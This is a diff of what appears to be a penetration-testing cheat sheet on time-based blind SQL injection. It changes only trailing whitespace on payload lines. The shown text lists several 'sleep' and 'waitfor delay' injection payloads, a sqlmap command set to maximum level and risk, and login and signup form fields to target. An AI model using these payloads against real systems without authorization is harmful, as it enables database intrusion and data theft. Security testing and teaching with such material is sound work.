@@ -4,14 +4,14 @@ For example: if the GET parameter ?username=Peter returns the same content as ?u
 
 
 ```
-')) or sleep(5)='
-;waitfor delay '0:0:5'--
-);waitfor delay '0:0:5'--
-';waitfor delay '0:0:5'--
-";waitfor delay '0:0:5'--
-');waitfor delay '0:0:5'--
-");waitfor delay '0:0:5'--
-));waitfor delay '0:0:5'--
+')) or sleep(5)=' 
+;waitfor delay '0:0:5'-- 
+);waitfor delay '0:0:5'-- 
+';waitfor delay '0:0:5'-- 
+";waitfor delay '0:0:5'-- 
+');waitfor delay '0:0:5'-- 
+");waitfor delay '0:0:5'-- 
+));waitfor delay '0:0:5'-- 
 ```
 
 
@@ -23,7 +23,7 @@ sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --
 2 Forget password page username parameter
 3 Singup Page firstname and last name parameter
 
-' WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'-- 
 ';WAITFOR DELAY '0:0:5'-- 
 ===>Comment
 
